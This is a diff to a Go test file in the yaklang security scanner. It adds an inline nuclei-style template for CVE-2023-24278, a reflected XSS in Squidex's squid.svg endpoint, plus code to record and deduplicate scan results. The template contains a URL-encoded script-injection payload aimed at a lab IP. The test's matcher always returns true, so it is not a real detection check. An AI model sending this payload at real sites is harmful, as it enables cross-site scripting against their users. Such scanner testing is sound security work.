@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"github.com/davecgh/go-spew/spew"
 	"github.com/yaklang/yaklang/common/consts"
+	"github.com/yaklang/yaklang/common/filter"
 	"github.com/yaklang/yaklang/common/log"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/utils/lowhttp"
@@ -242,23 +243,114 @@ func TestNewVars(t *testing.T) {
 }
 
 func TestScanAuto(t *testing.T) {
-	consts.GetGormProjectDatabase()
-	Scan := func(target string, opt ...interface{}) (chan *tools.PocVul, error) {
+	//consts.GetGormProjectDatabase()
+	rawTemp := `
+id: test
+info:
+  name: Squidex <7.4.0 - Cross-Site Scripting
+  author: r3Y3r53
+  severity: medium
+  description: |
+    Squidex before 7.4.0 contains a cross-site scripting vulnerability via the squid.svg endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
+  reference:
+    - https://census-labs.com/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/
+    - https://www.openwall.com/lists/oss-security/2023/03/16/1
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-24278
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cve-id: CVE-2023-24278
+    cwe-id: CWE-79
+  metadata:
+    shodan-query: http.favicon.hash:1099097618
+    verified: "true"
+  tags: cve,cve2023,xss,squidex,cms,unauth
+
+variables:
+  a1: "{{rand_int(1000,9000)}}"
+  a2: "{{rand_int(1000,9000)}}"
+  a3: "{{rand_int(1000,9000)}}{{a1}}"
+  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
+      - "{{BaseURL}}/squi{{a4}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
+    headers:
+      Authorization: "{{a1+a3}} {{a2}} {{BaseURL}}"
+      Test-Payload: "{{name}} {{a6}}"
+
+    payloads:
+      xadfasdfasf: C:\Users\go0p\Desktop\yak.txt
+      name:
+        - "admin123"
+        - "aaa123"
+      a6:
+        - "321nimda"
+        - 321aaa
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        part: body
+        dsl:
+          - "true"
+
+
+`
+	Scan := func(target any, opt ...interface{}) (chan *tools.PocVul, error) {
 		var vCh = make(chan *tools.PocVul)
+		//var targetVul *tools.PocVul
+		filterVul := filter.NewFilter()
+		calcSha1 := utils.CalcSha1(target)
+
 		opt = append(opt, _callback(func(i map[string]interface{}) {
+
 			if i["match"].(bool) {
+
 				tpl := i["template"].(*YakTemplate)
-				log.Infof("Scan callback: %#v", tpl)
-				vCh <- &tools.PocVul{
-					Source:    "nuclei",
-					Target:    target,
-					PocName:   tpl.Name,
-					MatchedAt: utils.DatetimePretty(),
-					Tags:      strings.Join(tpl.Tags, ","),
-					Timestamp: time.Now().Unix(),
-					Severity:  tpl.Severity,
-					//TitleName: ,
-					//Payload: ,
+				resp := i["responses"].([]*lowhttp.LowhttpResponse)
+				reqBulk := i["requests"].(*YakRequestBulkConfig)
+				//log.Infof("Scan callback: %#v", tpl)
+				details := make(map[string]interface{})
+				if len(resp) == 1 {
+					details["request"] = string(resp[0].RawRequest)
+					details["response"] = string(resp[0].RawPacket)
+				} else {
+					for idx, r := range resp {
+						details[fmt.Sprintf("request_%d", idx+1)] = string(r.RawRequest)
+						details[fmt.Sprintf("response_%d", idx+1)] = string(r.RawPacket)
+					}
+				}
+				payloads, err := payloadsToString(reqBulk.Payloads)
+				if err != nil {
+					log.Errorf("payloadsToString failed: %v", err)
+				}
+				pv := &tools.PocVul{
+					Source:        "nuclei",
+					Target:        resp[0].RemoteAddr,
+					PocName:       tpl.Name,
+					MatchedAt:     utils.DatetimePretty(),
+					Tags:          strings.Join(tpl.Tags, ","),
+					Timestamp:     time.Now().Unix(),
+					Severity:      tpl.Severity,
+					Details:       details,
+					CVE:           tpl.CVE,
+					DescriptionZh: tpl.DescriptionZh,
+					Description:   tpl.Description,
+					Payload:       payloads,
+				}
+				log.Infof("calcSha1: %s", calcSha1)
+				if !filterVul.Exist(calcSha1) {
+					filterVul.Insert(calcSha1)
+					risk := tools.PocVulToRisk(pv)
+					err = yakit.SaveRisk(risk)
+					log.Info("save risk")
+					if err != nil {
+						log.Errorf("save risk failed: %s", err)
+					}
+					vCh <- pv
 				}
 
 			}
@@ -267,13 +359,15 @@ func TestScanAuto(t *testing.T) {
 			defer close(vCh)
 			ScanAuto(target, opt...)
 		}()
+
 		return vCh, nil
 	}
 	res, _ := Scan(
-		"http://192.168.124.14:8080/S2-032/index.action",
-		WithTemplateName("[CVE-2016-3081]: Apache S2-032 Struts - Remote Code Execution"),
+		"http://192.168.3.113:8085/S2-032/index.action",
+		//WithTemplateName("[CVE-2016-3081]: Apache S2-032 Struts - Remote Code Execution"),
+		WithTemplateRaw(rawTemp),
 	)
 	for r := range res {
-		yakit.SaveRisk(tools.PocVulToRisk(r))
+		fmt.Println("xxx : ", r)
 	}
 }
